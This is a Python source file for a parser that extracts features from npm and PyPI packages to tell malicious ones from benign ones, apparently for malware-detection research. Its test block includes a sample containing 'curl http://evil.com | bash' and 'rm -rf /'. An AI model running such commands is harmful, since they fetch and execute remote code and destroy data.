"""
Unified parsing pipeline for extracting features from both malicious and benign packages.
Handles Python and JavaScript/TypeScript files with AST extraction and API call detection.
"""

import ast
import json
import os
import re
import subprocess
from dataclasses import dataclass, field
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple, Any
import hashlib


@dataclass
class CodeUnit:
    """Represents a unit of code (function or file) for analysis."""
    name: str
    file_path: Path
    ecosystem: str  # npm, pypi
    phase: str  # install, postinstall, runtime
    unit_type: str  # function, file, manifest
    
    # Content
    raw_content: str
    tokens: List[str] = field(default_factory=list)
    
    # AST features
    ast_nodes: List[str] = field(default_factory=list)
    control_flow: List[str] = field(default_factory=list)
    
    # API calls
    api_calls: List[str] = field(default_factory=list)
    api_categories: Set[str] = field(default_factory=set)
    
    # Metadata
    size_bytes: int = 0
    entropy: float = 0.0
    obfuscation_score: float = 0.0
    
    # Hashes for deduplication
    content_hash: str = ""


@dataclass
class PackageAnalysis:
    """Analysis results for an entire package."""
    name: str
    ecosystem: str
    category: str  # malicious_intent, compromised_lib, benign
    units: List[CodeUnit] = field(default_factory=list)
    manifest_info: Dict[str, Any] = field(default_factory=dict)


class UnifiedParser:
    """Unified parser for extracting features from packages."""
    
    def __init__(self):
        # API categories for intent classification
        self.api_categories = {
            "net.outbound": {
                "requests.get", "requests.post", "requests.put", "requests.delete",
                "urllib.request", "urllib2", "httplib", "http.client",
                "fetch", "XMLHttpRequest", "axios", "superagent", "got", "node-fetch",
                "http.get", "http.request", "https.get", "https.request"
            },
            "net.inbound": {
                "http.createServer", "express", "fastify", "koa", "hapi",
                "socket.io", "ws", "socketserver", "BaseHTTPServer"
            },
            "fs.read": {
                "fs.readFile", "fs.readFileSync", "fs.createReadStream",
                "open", "file", "Path.read_text", "Path.read_bytes",
                "os.path.exists", "os.listdir", "glob.glob"
            },
            "fs.write": {
                "fs.writeFile", "fs.writeFileSync", "fs.createWriteStream",
                "fs.mkdir", "fs.mkdirSync", "os.mkdir", "os.makedirs",
                "Path.write_text", "Path.write_bytes", "shutil.copy"
            },
            "proc.spawn": {
                "child_process.spawn", "child_process.exec", "child_process.fork",
                "subprocess.run", "subprocess.Popen", "subprocess.call",
                "os.system", "os.popen", "os.spawn"
            },
            "eval": {
                "eval", "exec", "Function", "vm.runInThisContext",
                "vm.runInNewContext", "compile", "__import__"
            },
            "crypto": {
                "crypto.createHash", "crypto.createHmac", "crypto.randomBytes",
                "hashlib", "hmac", "cryptography", "Crypto", "bcrypt", "scrypt"
            },
            "sys.env": {
                "process.env", "os.environ", "os.getenv", "sys.argv",
                "process.argv", "process.cwd", "os.getcwd"
            },
            "installer": {
                "npm.install", "pip.install", "setup.py", "postinstall",
                "preinstall", "install", "build"
            },
            "encoding": {
                "btoa", "atob", "Buffer.from", "base64", "binascii",
                "codecs", "urllib.parse", "decodeURIComponent", "JSON.parse"
            },
            "config": {
                "require", "import", "from", "module.exports", "exports",
                "__init__.py", "package.json", "setup.py", "pyproject.toml"
            }
        }
        
        # Keywords for phase detection
        self.install_keywords = {
            "postinstall", "preinstall", "install", "setup.py", "build",
            "scripts.install", "scripts.postinstall"
        }
        
        # Suspicious patterns for obfuscation detection
        self.obfuscation_patterns = [
            r"\\x[0-9a-fA-F]{2}",  # hex encoding
            r"\\u[0-9a-fA-F]{4}",  # unicode escapes
            r"atob\(|btoa\(",      # base64 operations
            r"eval\(.*\+",         # eval with concatenation
            r"String\.fromCharCode", # character code conversion
            r"[a-zA-Z0-9]{50,}",   # very long strings
        ]
    
    def parse_package(self, package_path: Path, 
                     package_name: str,
                     ecosystem: str,
                     category: str = "unknown") -> PackageAnalysis:
        """Parse an entire package and extract all units."""
        
        analysis = PackageAnalysis(
            name=package_name,
            ecosystem=ecosystem,
            category=category
        )
        
        if not package_path.exists():
            return analysis
        
        # Parse manifest files first
        manifest_unit = self._parse_manifest(package_path, ecosystem)
        if manifest_unit:
            analysis.units.append(manifest_unit)
            analysis.manifest_info = self._extract_manifest_info(manifest_unit)
        
        # Find and parse code files
        code_files = self._find_code_files(package_path, ecosystem)
        
        for file_path in code_files:
            try:
                units = self._parse_file(file_path, package_path, ecosystem)
                analysis.units.extend(units)
            except Exception as e:
                print(f"Error parsing {file_path}: {e}")
                continue
        
        return analysis
    
    def _find_code_files(self, package_path: Path, ecosystem: str) -> List[Path]:
        """Find relevant code files in a package."""
        code_files = []
        
        if ecosystem == "npm":
            # JavaScript/TypeScript files
            patterns = ["**/*.js", "**/*.ts", "**/*.jsx", "**/*.tsx", "**/package.json", "**/*.readme.md"]
        else:  # pypi
            # Python files
            patterns = ["**/*.py", "**/setup.py", "**/pyproject.toml", "**/setup.cfg", "**/*.readme.md"]
        
        for pattern in patterns:
            code_files.extend(package_path.rglob(pattern))
        
        # Filter out common directories to ignore
        ignore_patterns = {
            "node_modules", ".git", "__pycache__", ".pytest_cache",
            "dist", "build", ".tox", "venv", ".venv"
        }
        
        filtered_files = []
        for file_path in code_files:
            # Check if any part of the path contains ignored directories
            if not any(ignore in file_path.parts for ignore in ignore_patterns):
                filtered_files.append(file_path)
        
        return filtered_files[:100]  # Limit to avoid processing too many files
    
    def _parse_manifest(self, package_path: Path, ecosystem: str) -> Optional[CodeUnit]:
        """Parse package manifest file."""
        manifest_files = {
            "npm": ["package.json"],
            "pypi": ["setup.py", "pyproject.toml", "setup.cfg"]
        }
        
        for filename in manifest_files.get(ecosystem, []):
            manifest_path = package_path / filename
            if manifest_path.exists():
                try:
                    content = manifest_path.read_text(encoding='utf-8', errors='ignore')
                    
                    unit = CodeUnit(
                        name=f"manifest:{filename}",
                        file_path=manifest_path,
                        ecosystem=ecosystem,
                        phase="install",  # Manifests are always install-time
                        unit_type="manifest",
                        raw_content=content,
                        size_bytes=len(content.encode('utf-8')),
                        content_hash=hashlib.md5(content.encode()).hexdigest()
                    )
                    
                    # Extract basic features
                    unit.tokens = self._tokenize(content, ecosystem)
                    unit.api_calls = self._extract_api_calls(content)
                    unit.api_categories = self._categorize_api_calls(unit.api_calls)
                    unit.entropy = self._calculate_entropy(content)
                    unit.obfuscation_score = self._calculate_obfuscation_score(content)
                    
                    return unit
                    
                except Exception as e:
                    print(f"Error parsing manifest {manifest_path}: {e}")
                    continue
        
        return None
    
    def _parse_file(self, file_path: Path, package_root: Path, ecosystem: str) -> List[CodeUnit]:
        """Parse a single code file and extract units."""
        try:
            content = file_path.read_text(encoding='utf-8', errors='ignore')
        except:
            return []
        
        if not content.strip():
            return []
        
        # Determine phase (install vs runtime)
        relative_path = file_path.relative_to(package_root)
        phase = self._determine_phase(file_path, content)
        
        units = []
        
        if ecosystem == "pypi" and file_path.suffix == ".py":
            # Parse Python file
            py_units = self._parse_python_file(file_path, content, phase)
            units.extend(py_units)
        elif ecosystem == "npm" and file_path.suffix in [".js", ".ts", ".jsx", ".tsx"]:
            # Parse JavaScript/TypeScript file
            js_units = self._parse_javascript_file(file_path, content, phase) 
            units.extend(js_units)
        elif file_path.name == "package.json":
            # Already handled in manifest parsing
            pass
        else:
            # Treat as single unit
            unit = self._create_file_unit(file_path, content, ecosystem, phase)
            if unit:
                units.append(unit)
        
        return units
    
    def _parse_python_file(self, file_path: Path, content: str, phase: str) -> List[CodeUnit]:
        """Parse Python file and extract function-level units."""
        units = []
        
        try:
            tree = ast.parse(content)
            
            # Extract functions and classes as separate units
            for node in ast.walk(tree):
                if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                    func_unit = self._create_function_unit(
                        file_path, content, node, "python", phase
                    )
                    if func_unit:
                        units.append(func_unit)
                elif isinstance(node, ast.ClassDef):
                    class_unit = self._create_class_unit(
                        file_path, content, node, "python", phase  
                    )
                    if class_unit:
                        units.append(class_unit)
            
            # If no functions/classes found, treat whole file as one unit
            if not units:
                file_unit = self._create_file_unit(file_path, content, "pypi", phase)
                if file_unit:
                    units.append(file_unit)
                    
        except SyntaxError:
            # If AST parsing fails, treat as single unit
            file_unit = self._create_file_unit(file_path, content, "pypi", phase)
            if file_unit:
                units.append(file_unit)
        
        return units
    
    def _parse_javascript_file(self, file_path: Path, content: str, phase: str) -> List[CodeUnit]:
        """Parse JavaScript/TypeScript file and extract function-level units."""
        units = []
        
        # Simple regex-based function extraction for JS
        # For production, would use a proper JS parser like acorn
        function_patterns = [
            r"function\s+(\w+)\s*\([^)]*\)\s*\{",
            r"const\s+(\w+)\s*=\s*\([^)]*\)\s*=>\s*\{",
            r"let\s+(\w+)\s*=\s*\([^)]*\)\s*=>\s*\{",
            r"var\s+(\w+)\s*=\s*function\s*\([^)]*\)\s*\{",
            r"(\w+)\s*:\s*function\s*\([^)]*\)\s*\{",  # Object method
        ]
        
        found_functions = False
        for pattern in function_patterns:
            matches = re.finditer(pattern, content, re.MULTILINE)
            for match in matches:
                func_name = match.group(1)
                # Extract function body (simplified)
                start = match.start()
                func_content = content[start:start+500]  # Approximate
                
                unit = CodeUnit(
                    name=f"function:{func_name}",
                    file_path=file_path,
                    ecosystem="npm",
                    phase=phase,
                    unit_type="function",
                    raw_content=func_content,
                    size_bytes=len(func_content.encode('utf-8')),
                    content_hash=hashlib.md5(func_content.encode()).hexdigest()
                )
                
                # Extract features
                unit.tokens = self._tokenize(func_content, "npm")
                unit.api_calls = self._extract_api_calls(func_content)
                unit.api_categories = self._categorize_api_calls(unit.api_calls)
                unit.entropy = self._calculate_entropy(func_content)
                unit.obfuscation_score = self._calculate_obfuscation_score(func_content)
                
                units.append(unit)
                found_functions = True
        
        # If no functions found, treat whole file as one unit
        if not found_functions:
            file_unit = self._create_file_unit(file_path, content, "npm", phase)
            if file_unit:
                units.append(file_unit)
        
        return units
    
    def _create_file_unit(self, file_path: Path, content: str, ecosystem: str, phase: str) -> Optional[CodeUnit]:
        """Create a unit for an entire file."""
        if len(content) > 50000:  # Skip very large files
            return None
        
        unit = CodeUnit(
            name=f"file:{file_path.name}",
            file_path=file_path,
            ecosystem=ecosystem,
            phase=phase,
            unit_type="file",
            raw_content=content,
            size_bytes=len(content.encode('utf-8')),
            content_hash=hashlib.md5(content.encode()).hexdigest()
        )
        
        # Extract features
        unit.tokens = self._tokenize(content, ecosystem)
        unit.api_calls = self._extract_api_calls(content)
        unit.api_categories = self._categorize_api_calls(unit.api_calls)
        unit.entropy = self._calculate_entropy(content)
        unit.obfuscation_score = self._calculate_obfuscation_score(content)
        
        return unit
    
    def _create_function_unit(self, file_path: Path, file_content: str, 
                            func_node: ast.FunctionDef, ecosystem: str, phase: str) -> Optional[CodeUnit]:
        """Create a unit for a Python function."""
        try:
            # Extract function source
            func_source = ast.get_source_segment(file_content, func_node)
            if not func_source:
                return None
            
            unit = CodeUnit(
                name=f"function:{func_node.name}",
                file_path=file_path,
                ecosystem=ecosystem,
                phase=phase,
                unit_type="function",
                raw_content=func_source,
                size_bytes=len(func_source.encode('utf-8')),
                content_hash=hashlib.md5(func_source.encode()).hexdigest()
            )
            
            # Extract AST features
            unit.ast_nodes = self._extract_ast_nodes(func_node)
            unit.control_flow = self._extract_control_flow(func_node)
            
            # Extract other features
            unit.tokens = self._tokenize(func_source, ecosystem)
            unit.api_calls = self._extract_api_calls(func_source)
            unit.api_categories = self._categorize_api_calls(unit.api_calls)
            unit.entropy = self._calculate_entropy(func_source)
            unit.obfuscation_score = self._calculate_obfuscation_score(func_source)
            
            return unit
            
        except:
            return None
    
    def _create_class_unit(self, file_path: Path, file_content: str,
                         class_node: ast.ClassDef, ecosystem: str, phase: str) -> Optional[CodeUnit]:
        """Create a unit for a Python class."""
        try:
            class_source = ast.get_source_segment(file_content, class_node)
            if not class_source:
                return None
            
            unit = CodeUnit(
                name=f"class:{class_node.name}",
                file_path=file_path,
                ecosystem=ecosystem,
                phase=phase,
                unit_type="class",
                raw_content=class_source,
                size_bytes=len(class_source.encode('utf-8')),
                content_hash=hashlib.md5(class_source.encode()).hexdigest()
            )
            
            # Extract features (similar to function)
            unit.ast_nodes = self._extract_ast_nodes(class_node)
            unit.tokens = self._tokenize(class_source, ecosystem)
            unit.api_calls = self._extract_api_calls(class_source)
            unit.api_categories = self._categorize_api_calls(unit.api_calls)
            unit.entropy = self._calculate_entropy(class_source)
            unit.obfuscation_score = self._calculate_obfuscation_score(class_source)
            
            return unit
            
        except:
            return None
    
    def _determine_phase(self, file_path: Path, content: str) -> str:
        """Determine if code runs at install time or runtime."""
        
        # Check file path for install indicators
        path_str = str(file_path).lower()
        if any(keyword in path_str for keyword in self.install_keywords):
            return "install"
        
        # Check file name
        filename = file_path.name.lower()
        if filename in ["setup.py", "install.py", "postinstall.js"]:
            return "install"
        
        # Check content for install-time patterns
        content_lower = content.lower()
        install_patterns = [
            "postinstall", "preinstall", "npm install", "pip install",
            "setup(", "setuptools", "distutils"
        ]
        
        if any(pattern in content_lower for pattern in install_patterns):
            return "install"
        
        return "runtime"
    
    def _tokenize(self, content: str, ecosystem: str) -> List[str]:
        """Simple tokenization of code content."""
        # Remove comments
        if ecosystem == "pypi":
            content = re.sub(r'#.*$', '', content, flags=re.MULTILINE)
        else:  # npm
            content = re.sub(r'//.*$', '', content, flags=re.MULTILINE)
            content = re.sub(r'/\*.*?\*/', '', content, flags=re.DOTALL)
        
        # Basic tokenization (split on non-alphanumeric, keep strings)
        tokens = re.findall(r'\w+|"[^"]*"|\'[^\']*\'', content)
        return tokens[:1000]  # Limit token count
    
    def _extract_api_calls(self, content: str) -> List[str]:
        """Extract API calls from code content."""
        api_calls = []
        
        # Look for function calls and method calls
        patterns = [
            r'(\w+\.\w+)\s*\(',  # method calls like fs.readFile(
            r'(\w+)\s*\(',       # function calls like exec(
            r'import\s+(\w+)',   # imports
            r'require\s*\(\s*[\'"]([^\'"]+)[\'"]', # require statements
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, content)
            api_calls.extend(matches)
        
        return list(set(api_calls))  # Remove duplicates
    
    def _categorize_api_calls(self, api_calls: List[str]) -> Set[str]:
        """Categorize API calls into intent categories."""
        categories = set()
        
        for call in api_calls:
            for category, category_calls in self.api_categories.items():
                if any(pattern in call for pattern in category_calls):
                    categories.add(category)
        
        return categories
    
    def _extract_ast_nodes(self, node: ast.AST) -> List[str]:
        """Extract AST node types from a Python AST node."""
        node_types = []
        
        for child in ast.walk(node):
            node_types.append(type(child).__name__)
        
        return list(set(node_types))  # Remove duplicates
    
    def _extract_control_flow(self, node: ast.AST) -> List[str]:
        """Extract control flow patterns from AST."""
        control_flow = []
        
        for child in ast.walk(node):
            if isinstance(child, (ast.If, ast.For, ast.While, ast.Try, 
                                ast.With, ast.AsyncWith, ast.AsyncFor)):
                control_flow.append(type(child).__name__)
        
        return control_flow
    
    def _calculate_entropy(self, content: str) -> float:
        """Calculate Shannon entropy of content."""
        if not content:
            return 0.0
        
        # Count character frequencies
        char_counts = {}
        for char in content:
            char_counts[char] = char_counts.get(char, 0) + 1
        
        # Calculate entropy
        import math
        entropy = 0.0
        total_chars = len(content)
        
        for count in char_counts.values():
            probability = count / total_chars
            if probability > 0:
                entropy -= probability * math.log2(probability)
        
        return entropy
    
    def _calculate_obfuscation_score(self, content: str) -> float:
        """Calculate obfuscation score based on suspicious patterns."""
        if not content:
            return 0.0
        
        score = 0.0
        total_patterns = len(self.obfuscation_patterns)
        
        for pattern in self.obfuscation_patterns:
            matches = len(re.findall(pattern, content))
            if matches > 0:
                score += min(matches / 10.0, 1.0)  # Cap contribution per pattern
        
        return min(score / total_patterns, 1.0)  # Normalize to [0, 1]
    
    def _extract_manifest_info(self, manifest_unit: CodeUnit) -> Dict[str, Any]:
        """Extract structured information from manifest unit."""
        info = {}
        
        try:
            if "package.json" in manifest_unit.name:
                # Parse npm package.json
                data = json.loads(manifest_unit.raw_content)
                info = {
                    "dependencies": data.get("dependencies", {}),
                    "devDependencies": data.get("devDependencies", {}),
                    "scripts": data.get("scripts", {}),
                    "main": data.get("main"),
                    "version": data.get("version"),
                    "description": data.get("description", ""),
                }
            elif "setup.py" in manifest_unit.name:
                # Extract basic info from setup.py
                content = manifest_unit.raw_content
                info["has_setup"] = "setup(" in content
                info["install_requires"] = "install_requires" in content
                info["entry_points"] = "entry_points" in content
                
        except Exception as e:
            print(f"Error extracting manifest info: {e}")
        
        return info


if __name__ == "__main__":
    # Test the parser
    parser = UnifiedParser()
    
    # Test with a simple Python code snippet
    test_code = '''
import os
import subprocess

def malicious_function():
    # This looks suspicious
    os.system("curl http://evil.com | bash")
    subprocess.run(["rm", "-rf", "/"])
    
def benign_function():
    print("Hello world")
    '''
    
    # Create a temporary file for testing
    import tempfile
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write(test_code)
        temp_path = Path(f.name)
    
    try:
        units = parser._parse_python_file(temp_path, test_code, "runtime")
        print(f"Extracted {len(units)} units:")
        
        for unit in units:
            print(f"  {unit.name}:")
            print(f"    API calls: {unit.api_calls}")
            print(f"    Categories: {unit.api_categories}")
            print(f"    Entropy: {unit.entropy:.2f}")
            print(f"    Obfuscation: {unit.obfuscation_score:.2f}")
            
    finally:
        temp_path.unlink()  # Clean up